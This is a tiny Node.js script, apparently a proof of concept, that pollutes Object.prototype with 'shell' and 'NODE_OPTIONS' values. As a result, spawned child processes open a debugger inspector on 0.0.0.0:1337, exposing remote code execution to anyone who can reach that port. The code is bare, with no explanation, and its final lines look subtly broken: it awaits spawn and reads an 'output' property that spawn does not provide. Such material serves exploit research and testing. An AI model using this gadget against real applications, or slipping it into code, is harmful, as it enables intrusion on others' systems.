const { spawn, spawnSync, exec, execSync, execFile, execFileSync } = require('child_process');

Object.prototype.shell = "node";
Object.prototype.NODE_OPTIONS = '--inspect-brk=0.0.0.0:1337';

async function main() {
  const cp = await spawn('hostname');
  console.log(cp.output.toString());
}

main();
